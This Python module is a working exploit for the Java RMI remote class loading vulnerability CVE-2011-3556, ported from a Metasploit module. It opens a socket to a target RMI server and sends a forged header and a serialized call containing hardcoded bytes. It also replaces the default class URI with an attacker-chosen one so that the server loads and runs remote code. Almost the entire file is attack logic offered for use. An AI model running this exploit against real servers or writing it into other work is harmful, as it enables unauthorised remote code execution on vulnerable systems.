# coding: utf-8

import logging
import socket
import struct
import types

__version__ = (1, 0, 2)

class ExploitError(Exception):
    """
    Custom exception template for the module.
    """

    pass

class JavaRMIExploit:
    """
    Exploits the CVE-2011-3556 vulnerability (https://www.rapid7.com/db/vulnerabilities/jre-vuln-cve-2011-3556).
    """

    class Node:
        """
        Helper class to work with socket representation(s).
        """

        def __init__(self, host, port):
            self.host = host
            self.port = port

        def __str__(self):
            """
            Returns a string representation of the socket (eg. `host:port`).
            """

            return f"{self.host}:{self.port}"

        @property
        def tuplify(self):
            """
            Returns a tuple representation of the socket, for use within the `socket` module for example.
            """

            return (self.host, self.port)

    def __init__(self, host, target, port=1099, timeout=5, buffer_size=1024):
        """
        Registers the needed class variable(s).
        
        Several optional parameters can be passed: 
          - `port`: Port used to connect to the Java RMI server (defaults to 1099).
          - `timeout`: Timeout duration for the socket (defaults to 5 seconds). If `timeout` is -1, the socket will wait forever.
          - `buffer_size`: Custom buffer size for the socket (defaults to 1024).
        """

        self.options = types.SimpleNamespace(
            node=self.Node(host, port), 
            target=bytearray(target, "utf-8"), 
            buffer_size=buffer_size, 
            timeout=timeout)

        self.log = logging.getLogger("java_rmi_exploit")

        # Default payload (set by mihi in the original Metasploit Framework module) to overwrite when forging the RMI call.
        self.default_target = b"file:./rmidummy.jar"

        # Java RMI packets to be sent over the wire.
        self.rmi = types.SimpleNamespace(
            header=b"\x4a\x52\x4d\x49\x00\x02\x4b\x00\x00\x00\x00\x00\x00",
            call=b"\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\xb6\x89\x8d\x8b\xf2\x86\x43\x75\x72\x00\x18\x5b\x4c\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x4f\x62\x6a\x49\x44\x3b\x87\x13\x00\xb8\xd0\x2c\x64\x7e\x02\x00\x00\x70\x78\x70\x00\x00\x00\x00\x77\x08\x00\x00\x00\x00\x00\x00\x00\x00\x73\x72\x00\x14\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x2e\x52\x4d\x49\x4c\x6f\x61\x64\x65\x72\xa1\x65\x44\xba\x26\xf9\xc2\xf4\x02\x00\x00\x74\x00\x13\x66\x69\x6c\x65\x3a\x2e\x2f\x72\x6d\x69\x64\x75\x6d\x6d\x79\x2e\x6a\x61\x72\x78\x70\x77\x01\x00\x0a")

    def __cleanup(self):
        """
        Closes the open socket on class deletion.
        """

        if hasattr(self, "pipe"):
            getattr(self, "pipe").close()

    def __del__(self):
        """
        Calls the `__cleanup` method on class deletion.
        """

        self.__cleanup()

    def __connect(self):
        """
        Establishes connection to the target Java RMI server.

        Raises an `ExploitError` exception when:
          - The socket cannot be instanciated.
          - An interruption signal (SIGINT) is caught.
          - The connection request timed out.
          - The connection has been refused.
          - Any other network-related error.
        """

        try:
            self.pipe = socket.socket()
            self.pipe.settimeout(self.options.timeout)

        except OSError as exc:
            msg = f"Failed to instantiate TCP socket: {exc.strerror.lower()}."

            self.log.exception(msg)
            raise ExploitError(msg)

        try:
            self.log.debug(f"Establishing contact to '{str(self.options.node)}'...")
            self.pipe.connect(self.options.node.tuplify)
            self.log.info(f"Connection to '{str(self.options.node)}' established.")

        except KeyboardInterrupt as exc:
            msg = "Interrupted."

            self.log.error(msg)
            raise ExploitError(msg)

        except socket.timeout:
            msg = f"Connection attempt to '{str(self.options.node)}' timed out."

            self.log.error(msg)
            raise ExploitError(msg)

        except ConnectionRefusedError:
            msg = f"Connection refused to '{str(self.options.node)}'."

            self.log.error(msg)
            raise ExploitError(msg)

        except OSError as exc:
            msg = f"Failed to connect to '{str(self.options.node)}': {exc.strerror.lower()}."

            self.log.error(msg)
            raise ExploitError(msg)

    def __await_response(self):
        """
        Waits until data is received from the socket.

        Raises and `ExploitError` exception when:
          - No data can be received from the server.
          - The server does not allow loading classes from remote URI (basically not vulnerable).
        """

        data = self.pipe.recv(self.options.buffer_size)

        if not data:
            msg = "No data received from the server."

            self.log.error(msg)
            raise ExploitError(msg)

        elif b"RMI class loader disabled" in data:
            msg = f"Remote server '{str(self.options.node)}' does not allow loading class(es) from remote URIs."

            self.log.error(msg)
            raise ExploitError(msg)

    def __ignite(self):
        """
        Sends the forged RMI packets to the target server.
        """

        # Send the RMI header to the server.
        self.log.debug(f"Sending RMI header {self.rmi.header}.")
        self.pipe.send(self.rmi.header)
        self.__await_response()

        # Replace the hardcoded URI in the default RMI call (from the original Metasploit module) by the custom target URI.
        self.rmi.call = self.rmi.call.replace(
            struct.pack(">H", len(self.default_target)) + self.default_target, 
            struct.pack(">H", len(self.options.target)) + self.options.target)

        # Send the RMI call to the server.
        self.log.debug(f"Sending RMI call {self.rmi.call}.")
        self.pipe.send(self.rmi.call)
        self.__await_response()

        self.log.info("Payload successfully injected.")

    def exploit(self):
        """
        Launches the exploit and cleans up the "mess".
        """

        self.__connect()
        self.__ignite()
        self.__cleanup()
